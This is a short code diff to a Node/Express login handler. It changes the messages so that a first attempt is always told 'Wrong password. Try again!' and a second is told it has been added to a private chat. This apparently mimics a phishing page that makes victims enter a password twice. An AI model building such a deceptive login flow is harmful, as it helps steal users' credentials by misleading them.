@@ -70,7 +70,7 @@ app.post("/login", (req, res) => {
             req.session.message = 'Wrong password. Try again!';
             res.json({ message: req.session.message, redirect: false });
         } else {
-            req.session.message = attemptNumber === 1 ? 'Wrong password' : 'You have been successfully added.';
+            req.session.message = attemptNumber === 1 ? 'Wrong password. Try again!' : 'You have been successfully added to the private chat, you will get a message request shortly.';
             req.session.attempt = attemptNumber === 1 ? 2 : 1;
 
             res.json({
